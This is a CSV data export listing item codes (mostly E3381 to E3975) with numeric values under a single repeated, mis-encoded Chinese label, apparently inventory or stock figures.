' ½­Òõ¿â´æ,E3381,"",0.66800000000000003819
' ½­Òõ¿â´æ,E3382,"",0.59699999999999997513
' ½­Òõ¿â´æ,E3383,"",13.50799999999999911893
' ½­Òõ¿â´æ,E3384,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3385,"",0.91800000000000003819
' ½­Òõ¿â´æ,E3386,"",1.97799999999999998046
' ½­Òõ¿â´æ,E3387,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3388,"",1.03600000000000003197
' ½­Òõ¿â´æ,E3389,"",1.97799999999999998046
' ½­Òõ¿â´æ,E3390,"",1.01200000000000001066
' ½­Òõ¿â´æ,E3391,"",1.01200000000000001066
' ½­Òõ¿â´æ,E3392,"",1.01200000000000001066
' ½­Òõ¿â´æ,E3394,"",1.11299999999999998934
' ½­Òõ¿â´æ,E3395,"",2.88899999999999979039
' ½­Òõ¿â´æ,E3396,"",2.93599999999999994316
' ½­Òõ¿â´æ,E3397,"",4.09299999999999997158
' ½­Òõ¿â´æ,E3398,"",1.31899999999999995026
' ½­Òõ¿â´æ,E3399,"",8.35200000000000031264
' ½­Òõ¿â´æ,E3400,"",1.24300000000000010481
' ½­Òõ¿â´æ,E3401,"",0.76300000000000001155
' ½­Òõ¿â´æ,E3402,"",0.69899999999999995470
' ½­Òõ¿â´æ,E3405,"",1.86400000000000010125
' ½­Òõ¿â´æ,E3406,"",4.43299999999999982947
' ½­Òõ¿â´æ,E3407,"",2.57900000000000018119
' ½­Òõ¿â´æ,E3408,"",6.32899999999999973710
' ½­Òõ¿â´æ,E3409,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3410,"",1.66700000000000003730
' ½­Òõ¿â´æ,E3411,"",3.98899999999999987921
' ½­Òõ¿â´æ,E3412,"",1.20900000000000007461
' ½­Òõ¿â´æ,E3413,"",0.98899999999999999023
' ½­Òõ¿â´æ,E3414,"",0.92300000000000004263
' ½­Òõ¿â´æ,E3415,"",0.74399999999999999467
' ½­Òõ¿â´æ,E3416,"",0.64300000000000001599
' ½­Òõ¿â´æ,E3417,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3418,"",5.36399999999999987921
' ½­Òõ¿â´æ,E3419,"",1.61699999999999999289
' ½­Òõ¿â´æ,E3420,"",5.31200000000000027711
' ½­Òõ¿â´æ,E3421,"",5.64599999999999990763
' ½­Òõ¿â´æ,E3422,"",1.16799999999999992717
' ½­Òõ¿â´æ,E3424,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3425,"",1.07200000000000006395
' ½­Òõ¿â´æ,E3427,"",1.84600000000000008527
' ½­Òõ¿â´æ,E3428,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3430,"",3.75700000000000011724
' ½­Òõ¿â´æ,E3431,"",6.04100000000000036948
' ½­Òõ¿â´æ,E3432,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3433,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3434,"",2.12199999999999988631
' ½­Òõ¿â´æ,E3437,"",1.60600000000000009415
' ½­Òõ¿â´æ,E3438,"",2.15099999999999980105
' ½­Òõ¿â´æ,E3440,"",0.80900000000000005240
' ½­Òõ¿â´æ,E3444,"",1.51099999999999989875
' ½­Òõ¿â´æ,E3445,"",0.50900000000000000799
' ½­Òõ¿â´æ,E3446,"",1.88399999999999989697
' ½­Òõ¿â´æ,E3447,"",8.10100000000000086686
' ½­Òõ¿â´æ,E3448,"",3.81800000000000006040
' ½­Òõ¿â´æ,E3449,"",10.92399999999999948841
' ½­Òõ¿â´æ,E3451,"",7.24899999999999966604
' ½­Òõ¿â´æ,E3452,"",7.15899999999999980815
' ½­Òõ¿â´æ,E3453,"",3.54199999999999981526
' ½­Òõ¿â´æ,E3454,"",5.36399999999999987921
' ½­Òõ¿â´æ,E3455,"",6.72599999999999997868
' ½­Òõ¿â´æ,E3456,"",6.48399999999999998579
' ½­Òõ¿â´æ,E3457,"",7.12800000000000011369
' ½­Òõ¿â´æ,E3458,"",6.02899999999999991473
' ½­Òõ¿â´æ,E3459,"",1.07400000000000006573
' ½­Òõ¿â´æ,E3460,"",2.04099999999999992539
' ½­Òõ¿â´æ,E3462,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3464,"",1.40199999999999991296
' ½­Òõ¿â´æ,E3465,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3466,"",4.39799999999999968736
' ½­Òõ¿â´æ,E3467,"",8.35200000000000031264
' ½­Òõ¿â´æ,E3468,"",2.01900000000000012790
' ½­Òõ¿â´æ,E3469,"",1.02400000000000002132
' ½­Òõ¿â´æ,E3470,"",1.46199999999999996625
' ½­Òõ¿â´æ,E3471,"",1.15399999999999991473
' ½­Òõ¿â´æ,E3472,"",2.13099999999999978328
' ½­Òõ¿â´æ,E3473,"",3.72900000000000009237
' ½­Òõ¿â´æ,E3474,"",3.22900000000000009237
' ½­Òõ¿â´æ,E3475,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3476,"",3.66900000000000003908
' ½­Òõ¿â´æ,E3477,"",2.10599999999999987210
' ½­Òõ¿â´æ,E3478,"",0.98899999999999999023
' ½­Òõ¿â´æ,E3479,"",1.71399999999999996803
' ½­Òõ¿â´æ,E3480,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3481,"",2.73399999999999998579
' ½­Òõ¿â´æ,E3482,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3483,"",1.81699999999999994849
' ½­Òõ¿â´æ,E3484,"",2.63899999999999979039
' ½­Òõ¿â´æ,E3485,"",3.04599999999999981881
' ½­Òõ¿â´æ,E3486,"",3.04599999999999981881
' ½­Òõ¿â´æ,E3487,"",2.98300000000000009592
' ½­Òõ¿â´æ,E3488,"",1.18700000000000005507
' ½­Òõ¿â´æ,E3491,"",0.87900000000000000355
' ½­Òõ¿â´æ,E3492,"",7.94200000000000017053
' ½­Òõ¿â´æ,E3493,"",3.23899999999999987921
' ½­Òõ¿â´æ,E3494,"",1.00899999999999989697
' ½­Òõ¿â´æ,E3495,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3496,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3497,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3498,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3500,"",1.09899999999999997691
' ½­Òõ¿â´æ,E3501,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3502,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3503,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3504,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3507,"",1.08299999999999996270
' ½­Òõ¿â´æ,E3508,"",1.14599999999999990763
' ½­Òõ¿â´æ,E3509,"",0.88900000000000001243
' ½­Òõ¿â´æ,E3510,"",5.30100000000000015632
' ½­Òõ¿â´æ,E3511,"",3.93800000000000016698
' ½­Òõ¿â´æ,E3512,"",2.03600000000000003197
' ½­Òõ¿â´æ,E3513,"",1.20900000000000007461
' ½­Òõ¿â´æ,E3515,"",0.56499999999999994671
' ½­Òõ¿â´æ,E3516,"",4.47499999999999964473
' ½­Òõ¿â´æ,E3517,"",1.37799999999999989164
' ½­Òõ¿â´æ,E3518,"",1.16599999999999992539
' ½­Òõ¿â´æ,E3520,"",3.10899999999999998579
' ½­Òõ¿â´æ,E3521,"",3.89599999999999990763
' ½­Òõ¿â´æ,E3522,"",4.42300000000000004263
' ½­Òõ¿â´æ,E3523,"",1.14199999999999990408
' ½­Òõ¿â´æ,E3525,"",1.11400000000000010125
' ½­Òõ¿â´æ,E3526,"",0.97699999999999997957
' ½­Òõ¿â´æ,E3527,"",1.11400000000000010125
' ½­Òõ¿â´æ,E3528,"",1.09899999999999997691
' ½­Òõ¿â´æ,E3529,"",1.12900000000000000355
' ½­Òõ¿â´æ,E3530,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3531,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3532,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3533,"",1.00699999999999989519
' ½­Òõ¿â´æ,E3534,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3535,"",1.64900000000000002132
' ½­Òõ¿â´æ,E3537,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3539,"",0.98299999999999998490
' ½­Òõ¿â´æ,E3541,"",0.86399999999999999023
' ½­Òõ¿â´æ,E3542,"",0.98799999999999998934
' ½­Òõ¿â´æ,E3547,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3548,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3550,"",1.48799999999999998934
' ½­Òõ¿â´æ,E3551,"",3.22400000000000019895
' ½­Òõ¿â´æ,E3552,"",2.19799999999999995381
' ½­Òõ¿â´æ,E3553,"",2.05500000000000015987
' ½­Òõ¿â´æ,E3554,"",3.10899999999999998579
' ½­Òõ¿â´æ,E3555,"",1.30800000000000005151
' ½­Òõ¿â´æ,E3556,"",0.55100000000000004530
' ½­Òõ¿â´æ,E3557,"",0.97699999999999997957
' ½­Òõ¿â´æ,E3558,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3559,"",0.78100000000000002753
' ½­Òõ¿â´æ,E3560,"",1.11200000000000009948
' ½­Òõ¿â´æ,E3561,"",0.79300000000000003819
' ½­Òõ¿â´æ,E3562,"",2.26699999999999990408
' ½­Òõ¿â´æ,E3563,"",3.11600000000000010303
' ½­Òõ¿â´æ,E3564,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3565,"",2.59299999999999997158
' ½­Òõ¿â´æ,E3566,"",0.97699999999999997957
' ½­Òõ¿â´æ,E3567,"",1.96300000000000007816
' ½­Òõ¿â´æ,E3568,"",1.47799999999999998046
' ½­Òõ¿â´æ,E3570,"",11.89300000000000068212
' ½­Òõ¿â´æ,E3571,"",10.60200000000000031264
' ½­Òõ¿â´æ,E3572,"",0.73399999999999998579
' ½­Òõ¿â´æ,E3575,"",1.92700000000000004619
' ½­Òõ¿â´æ,E3576,"",1.31299999999999994493
' ½­Òõ¿â´æ,E3578,"",3.79400000000000003908
' ½­Òõ¿â´æ,E3579,"",1.01200000000000001066
' ½­Òõ¿â´æ,E3580,"",6.86599999999999965894
' ½­Òõ¿â´æ,E3581,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3582,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3583,"",3.80600000000000004974
' ½­Òõ¿â´æ,E3585,"",1.30600000000000004974
' ½­Òõ¿â´æ,E3586,"",1.33200000000000007283
' ½­Òõ¿â´æ,E3588,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3589,"",0.83399999999999996358
' ½­Òõ¿â´æ,E3590,"",0.90400000000000002576
' ½­Òõ¿â´æ,E3591,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3592,"",1.24300000000000010481
' ½­Òõ¿â´æ,E3593,"",0.91300000000000003375
' ½­Òõ¿â´æ,E3594,"",0.91300000000000003375
' ½­Òõ¿â´æ,E3595,"",0.92600000000000004530
' ½­Òõ¿â´æ,E3596,"",1.00200000000000000178
' ½­Òõ¿â´æ,E3597,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3598,"",1.51899999999999990585
' ½­Òõ¿â´æ,E3599,"",1.83699999999999996625
' ½­Òõ¿â´æ,E3601,"",2.59100000000000019185
' ½­Òõ¿â´æ,E3604,"",1.09400000000000008349
' ½­Òõ¿â´æ,E3605,"",3.03100000000000013856
' ½­Òõ¿â´æ,E3606,"",0.58199999999999996181
' ½­Òõ¿â´æ,E3607,"",1.80099999999999993427
' ½­Òõ¿â´æ,E3608,"",0.83099999999999996092
' ½­Òõ¿â´æ,E3609,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3610,"",1.05299999999999993605
' ½­Òõ¿â´æ,E3611,"",1.32400000000000006573
' ½­Òõ¿â´æ,E3612,"",0.86699999999999999289
' ½­Òõ¿â´æ,E3613,"",3.61699999999999999289
' ½­Òõ¿â´æ,E3614,"",3.02199999999999979750
' ½­Òõ¿â´æ,E3615,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3616,"",1.29800000000000004263
' ½­Òõ¿â´æ,E3617,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3618,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3619,"",8.59299999999999997158
' ½­Òõ¿â´æ,E3620,"",10.99900000000000055422
' ½­Òõ¿â´æ,E3621,"",1.29400000000000003908
' ½­Òõ¿â´æ,E3622,"",17.45100000000000051159
' ½­Òõ¿â´æ,E3625,"",2.56700000000000017053
' ½­Òõ¿â´æ,E3626,"",2.56700000000000017053
' ½­Òõ¿â´æ,E3627,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3628,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3629,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3631,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3632,"",1.21700000000000008171
' ½­Òõ¿â´æ,E3633,"",1.06400000000000005684
' ½­Òõ¿â´æ,E3634,"",0.96799999999999997158
' ½­Òõ¿â´æ,E3635,"",0.91900000000000003908
' ½­Òõ¿â´æ,E3637,"",0.85299999999999998046
' ½­Òõ¿â´æ,E3638,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3639,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3640,"",1.05200000000000004619
' ½­Òõ¿â´æ,E3641,"",2.20100000000000006750
' ½­Òõ¿â´æ,E3642,"",2.23899999999999987921
' ½­Òõ¿â´æ,E3643,"",0.56499999999999994671
' ½­Òõ¿â´æ,E3644,"",1.96900000000000008349
' ½­Òõ¿â´æ,E3645,"",0.54300000000000003819
' ½­Òõ¿â´æ,E3646,"",0.62199999999999999734
' ½­Òõ¿â´æ,E3647,"",0.59899999999999997691
' ½­Òõ¿â´æ,E3648,"",0.31700000000000000400
' ½­Òõ¿â´æ,E3649,"",0.62199999999999999734
' ½­Òõ¿â´æ,E3653,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3654,"",1.03099999999999991651
' ½­Òõ¿â´æ,E3655,"",0.98199999999999998401
' ½­Òõ¿â´æ,E3656,"",2.32699999999999995737
' ½­Òõ¿â´æ,E3657,"",2.27199999999999979750
' ½­Òõ¿â´æ,E3658,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3659,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3660,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3661,"",0.93300000000000005151
' ½­Òõ¿â´æ,B3663,"",32.79999999999999715783
' ½­Òõ¿â´æ,E3663,"",5.27200000000000024158
' ½­Òõ¿â´æ,E3664,"",1.45100000000000006750
' ½­Òõ¿â´æ,E3665,"",2.44799999999999995381
' ½­Òõ¿â´æ,E3666,"",2.30799999999999982947
' ½­Òõ¿â´æ,E3670,"",1.19300000000000006040
' ½­Òõ¿â´æ,E3671,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3672,"",0.98099999999999998312
' ½­Òõ¿â´æ,E3673,"",4.67300000000000004263
' ½­Òõ¿â´æ,E3674,"",0.88400000000000000799
' ½­Òõ¿â´æ,E3675,"",3.81800000000000006040
' ½­Òõ¿â´æ,E3676,"",2.56899999999999995026
' ½­Òõ¿â´æ,E3677,"",0.82699999999999995737
' ½­Òõ¿â´æ,E3678,"",1.17799999999999993605
' ½­Òõ¿â´æ,E3679,"",0.59899999999999997691
' ½­Òõ¿â´æ,E3680,"",2.07500000000000017764
' ½­Òõ¿â´æ,E3681,"",0.55400000000000004796
' ½­Òõ¿â´æ,E3682,"",0.59899999999999997691
' ½­Òõ¿â´æ,E3683,"",0.52400000000000002132
' ½­Òõ¿â´æ,E3684,"",0.56299999999999994493
' ½­Òõ¿â´æ,E3685,"",0.56799999999999994937
' ½­Òõ¿â´æ,E3686,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3688,"",7.96900000000000030553
' ½­Òõ¿â´æ,E3690,"",0.91100000000000003197
' ½­Òõ¿â´æ,E3691,"",0.62600000000000000089
' ½­Òõ¿â´æ,E3692,"",0.79200000000000003730
' ½­Òõ¿â´æ,E3693,"",0.59899999999999997691
' ½­Òõ¿â´æ,E3694,"",3.17399999999999993250
' ½­Òõ¿â´æ,E3695,"",4.81500000000000039080
' ½­Òõ¿â´æ,E3696,"",2.65399999999999991473
' ½­Òõ¿â´æ,E3697,"",3.80699999999999993960
' ½­Òõ¿â´æ,E3699,"",1.35600000000000009415
' ½­Òõ¿â´æ,E3701,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3702,"",3.05399999999999982592
' ½­Òõ¿â´æ,E3703,"",1.83600000000000007638
' ½­Òõ¿â´æ,E3704,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3705,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3706,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3707,"",0.86699999999999999289
' ½­Òõ¿â´æ,E3708,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3709,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3710,"",0.91600000000000003642
' ½­Òõ¿â´æ,E3711,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3713,"",0.81100000000000005418
' ½­Òõ¿â´æ,E3714,"",0.59299999999999997158
' ½­Òõ¿â´æ,E3715,"",4.97400000000000019895
' ½­Òõ¿â´æ,E3716,"",0.56499999999999994671
' ½­Òõ¿â´æ,E3717,"",0.66800000000000003819
' ½­Òõ¿â´æ,E3718,"",0.96699999999999997069
' ½­Òõ¿â´æ,E3719,"",0.90700000000000002842
' ½­Òõ¿â´æ,E3720,"",1.88300000000000000711
' ½­Òõ¿â´æ,E3722,"",5.53899999999999970157
' ½­Òõ¿â´æ,E3723,"",2.52400000000000002132
' ½­Òõ¿â´æ,E3725,"",0.80800000000000005151
' ½­Òõ¿â´æ,E3726,"",2.57699999999999995737
' ½­Òõ¿â´æ,E3727,"",1.70799999999999996270
' ½­Òõ¿â´æ,E3728,"",5.03099999999999969447
' ½­Òõ¿â´æ,E3729,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3730,"",1.53099999999999991651
' ½­Òõ¿â´æ,E3732,"",2.52400000000000002132
' ½­Òõ¿â´æ,E3733,"",1.01400000000000001243
' ½­Òõ¿â´æ,E3734,"",1.10899999999999998579
' ½­Òõ¿â´æ,E3736,"",0.99299999999999999378
' ½­Òõ¿â´æ,E3737,"",0.82699999999999995737
' ½­Òõ¿â´æ,E3739,"",2.76100000000000012079
' ½­Òõ¿â´æ,E3740,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3741,"",2.27199999999999979750
' ½­Òõ¿â´æ,E3743,"",1.22900000000000009237
' ½­Òõ¿â´æ,E3744,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3745,"",0.81399999999999994582
' ½­Òõ¿â´æ,E3748,"",4.43299999999999982947
' ½­Òõ¿â´æ,E3749,"",0.90100000000000002309
' ½­Òõ¿â´æ,E3751,"",1.11299999999999998934
' ½­Òõ¿â´æ,E3752,"",2.02199999999999979750
' ½­Òõ¿â´æ,E3753,"",2.02199999999999979750
' ½­Òõ¿â´æ,E3754,"",2.02199999999999979750
' ½­Òõ¿â´æ,E3755,"",2.02199999999999979750
' ½­Òõ¿â´æ,E3756,"",3.19099999999999983658
' ½­Òõ¿â´æ,E3757,"",1.96199999999999996625
' ½­Òõ¿â´æ,E3758,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3759,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3760,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3761,"",1.11299999999999998934
' ½­Òõ¿â´æ,E3762,"",1.11299999999999998934
' ½­Òõ¿â´æ,E3763,"",1.01200000000000001066
' ½­Òõ¿â´æ,E3764,"",1.66300000000000003375
' ½­Òõ¿â´æ,E3765,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3766,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3768,"",0.84199999999999997069
' ½­Òõ¿â´æ,E3769,"",1.09899999999999997691
' ½­Òõ¿â´æ,E3770,"",2.96399999999999996803
' ½­Òõ¿â´æ,E3771,"",1.31899999999999995026
' ½­Òõ¿â´æ,E3772,"",1.31899999999999995026
' ½­Òõ¿â´æ,E3773,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3774,"",1.13799999999999990052
' ½­Òõ¿â´æ,E3776,"",0.72299999999999997602
' ½­Òõ¿â´æ,E3777,"",1.02099999999999990763
' ½­Òõ¿â´æ,E3778,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3779,"",0.76900000000000001688
' ½­Òõ¿â´æ,E3780,"",0.67800000000000004707
' ½­Òõ¿â´æ,E3781,"",2.73799999999999998934
' ½­Òõ¿â´æ,E3782,"",0.98299999999999998490
' ½­Òõ¿â´æ,E3783,"",1.05800000000000005151
' ½­Òõ¿â´æ,E3784,"",0.76600000000000001421
' ½­Òõ¿â´æ,E3785,"",2.06599999999999983658
' ½­Òõ¿â´æ,E3786,"",2.19799999999999995381
' ½­Òõ¿â´æ,E3787,"",1.91199999999999992184
' ½­Òõ¿â´æ,E3788,"",7.72900000000000009237
' ½­Òõ¿â´æ,E3789,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3790,"",2.44499999999999984013
' ½­Òõ¿â´æ,E3791,"",1.69700000000000006395
' ½­Òõ¿â´æ,E3792,"",0.72799999999999998046
' ½­Òõ¿â´æ,E3793,"",0.46600000000000002531
' ½­Òõ¿â´æ,E3795,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3796,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3797,"",1.83699999999999996625
' ½­Òõ¿â´æ,E3798,"",1.14599999999999990763
' ½­Òõ¿â´æ,E3799,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3800,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3801,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3803,"",5.00800000000000000711
' ½­Òõ¿â´æ,E3804,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3805,"",1.80899999999999994138
' ½­Òõ¿â´æ,E3807,"",1.20700000000000007283
' ½­Òõ¿â´æ,E3808,"",15.50399999999999955946
' ½­Òõ¿â´æ,E3809,"",1.20900000000000007461
' ½­Òõ¿â´æ,E3810,"",0.90700000000000002842
' ½­Òõ¿â´æ,E3811,"",0.96699999999999997069
' ½­Òõ¿â´æ,E3812,"",0.90700000000000002842
' ½­Òõ¿â´æ,E3813,"",0.67800000000000004707
' ½­Òõ¿â´æ,E3814,"",4.24800000000000022027
' ½­Òõ¿â´æ,E3815,"",0.76300000000000001155
' ½­Òõ¿â´æ,E3817,"",0.85199999999999997957
' ½­Òõ¿â´æ,E3818,"",0.63300000000000000711
' ½­Òõ¿â´æ,E3819,"",0.83299999999999996270
' ½­Òõ¿â´æ,E3820,"",1.03200000000000002842
' ½­Òõ¿â´æ,E3821,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3822,"",1.33200000000000007283
' ½­Òõ¿â´æ,E3823,"",16.86700000000000088107
' ½­Òõ¿â´æ,E3827,"",0.57399999999999995470
' ½­Òõ¿â´æ,E3828,"",0.92300000000000004263
' ½­Òõ¿â´æ,E3829,"",6.67699999999999960210
' ½­Òõ¿â´æ,E3831,"",1.69599999999999995204
' ½­Òõ¿â´æ,E3832,"",1.16799999999999992717
' ½­Òõ¿â´æ,E3833,"",1.32699999999999995737
' ½­Òõ¿â´æ,B3834,"",18.39999999999999857891
' ½­Òõ¿â´æ,E3834,"",4.47799999999999975842
' ½­Òõ¿â´æ,E3835,"",1.69599999999999995204
' ½­Òõ¿â´æ,E3836,"",9.32600000000000051159
' ½­Òõ¿â´æ,E3838,"",1.00499999999999989342
' ½­Òõ¿â´æ,E3840,"",5.61899999999999977263
' ½­Òõ¿â´æ,E3842,"",1.05600000000000004974
' ½­Òõ¿â´æ,E3843,"",1.02400000000000002132
' ½­Òõ¿â´æ,E3844,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3846,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3847,"",0.59799999999999997602
' ½­Òõ¿â´æ,E3848,"",2.21399999999999996803
' ½­Òõ¿â´æ,E3849,"",3.20900000000000007461
' ½­Òõ¿â´æ,E3850,"",1.96300000000000007816
' ½­Òõ¿â´æ,E3851,"",0.44900000000000001021
' ½­Òõ¿â´æ,E3852,"",0.70699999999999996181
' ½­Òõ¿â´æ,E3854,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3855,"",0.93300000000000005151
' ½­Òõ¿â´æ,E3859,"",11.58300000000000018474
' ½­Òõ¿â´æ,E3860,"",1.01699999999999990408
' ½­Òõ¿â´æ,E3862,"",1.55099999999999993427
' ½­Òõ¿â´æ,E3864,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3865,"",4.42100000000000026290
' ½­Òõ¿â´æ,E3866,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3867,"",1.95599999999999996092
' ½­Òõ¿â´æ,E3868,"",6.10799999999999965183
' ½­Òõ¿â´æ,E3869,"",6.10799999999999965183
' ½­Òõ¿â´æ,E3870,"",1.74399999999999999467
' ½­Òõ¿â´æ,E3874,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3875,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3876,"",1.48799999999999998934
' ½­Òõ¿â´æ,E3877,"",10.59800000000000075318
' ½­Òõ¿â´æ,E3878,"",1.16799999999999992717
' ½­Òõ¿â´æ,E3879,"",0.90700000000000002842
' ½­Òõ¿â´æ,E3880,"",2.67700000000000004619
' ½­Òõ¿â´æ,E3881,"",1.02800000000000002487
' ½­Òõ¿â´æ,E3882,"",0.98299999999999998490
' ½­Òõ¿â´æ,E3883,"",0.69699999999999995293
' ½­Òõ¿â´æ,E3885,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3886,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3888,"",7.23200000000000020606
' ½­Òõ¿â´æ,E3889,"",0.87700000000000000178
' ½­Òõ¿â´æ,E3890,"",1.02499999999999991118
' ½­Òõ¿â´æ,E3892,"",1.15700000000000002842
' ½­Òõ¿â´æ,E3894,"",2.61600000000000010303
' ½­Òõ¿â´æ,E3896,"",0.62800000000000000266
' ½­Òõ¿â´æ,E3898,"",2.02800000000000002487
' ½­Òõ¿â´æ,E3899,"",1.19300000000000006040
' ½­Òõ¿â´æ,E3900,"",1.07400000000000006573
' ½­Òõ¿â´æ,E3902,"",1.20900000000000007461
' ½­Òõ¿â´æ,E3905,"",1.07699999999999995737
' ½­Òõ¿â´æ,E3906,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3907,"",0.91300000000000003375
' ½­Òõ¿â´æ,E3909,"",1.21100000000000007638
' ½­Òõ¿â´æ,E3910,"",3.34699999999999997513
' ½­Òõ¿â´æ,E3912,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3913,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3916,"",1.02499999999999991118
' ½­Òõ¿â´æ,E3917,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3918,"",1.14599999999999990763
' ½­Òõ¿â´æ,E3919,"",0.79800000000000004263
' ½­Òõ¿â´æ,E3920,"",1.55099999999999993427
' ½­Òõ¿â´æ,E3922,"",4.19800000000000039790
' ½­Òõ¿â´æ,E3923,"",2.65099999999999980105
' ½­Òõ¿â´æ,E3924,"",2.18699999999999983302
' ½­Òõ¿â´æ,E3926,"",1.02099999999999990763
' ½­Òõ¿â´æ,E3927,"",1.09600000000000008527
' ½­Òõ¿â´æ,E3929,"",2.17200000000000015277
' ½­Òõ¿â´æ,E3931,"",0.98799999999999998934
' ½­Òõ¿â´æ,E3934,"",0.91300000000000003375
' ½­Òõ¿â´æ,E3935,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3936,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3937,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3938,"",2.56700000000000017053
' ½­Òõ¿â´æ,E3939,"",0.67800000000000004707
' ½­Òõ¿â´æ,E3940,"",0.96599999999999996980
' ½­Òõ¿â´æ,E3941,"",1.15999999999999992006
' ½­Òõ¿â´æ,E3942,"",1.18100000000000004974
' ½­Òõ¿â´æ,E3944,"",0.53600000000000003197
' ½­Òõ¿â´æ,E3945,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3946,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3947,"",2.02599999999999980105
' ½­Òõ¿â´æ,E3950,"",2.32699999999999995737
' ½­Òõ¿â´æ,E3951,"",0.72199999999999997513
' ½­Òõ¿â´æ,E3952,"",0.55400000000000004796
' ½­Òõ¿â´æ,E3954,"",5.36899999999999977263
' ½­Òõ¿â´æ,E3955,"",0.58399999999999996358
' ½­Òõ¿â´æ,E3957,"",1.96900000000000008349
' ½­Òõ¿â´æ,E3958,"",1.50200000000000000178
' ½­Òõ¿â´æ,E3959,"",0.88800000000000001155
' ½­Òõ¿â´æ,E3960,"",0.84099999999999996980
' ½­Òõ¿â´æ,E3961,"",0.83599999999999996536
' ½­Òõ¿â´æ,E3962,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3963,"",3.66900000000000003908
' ½­Òõ¿â´æ,E3966,"",4.02700000000000013500
' ½­Òõ¿â´æ,E3967,"",0.88300000000000000711
' ½­Òõ¿â´æ,E3968,"",1.28600000000000003197
' ½­Òõ¿â´æ,E3969,"",1.21300000000000007816
' ½­Òõ¿â´æ,E3970,"",3.37300000000000022027
' ½­Òõ¿â´æ,E3971,"",0.87600000000000000089
' ½­Òõ¿â´æ,E3972,"",5.09100000000000019185
' ½­Òõ¿â´æ,E3973,"",1.51699999999999990408
' ½­Òõ¿â´æ,E3974,"",1.25600000000000000533
' ½­Òõ¿â´æ,E3975,"",0.64300000000000001599
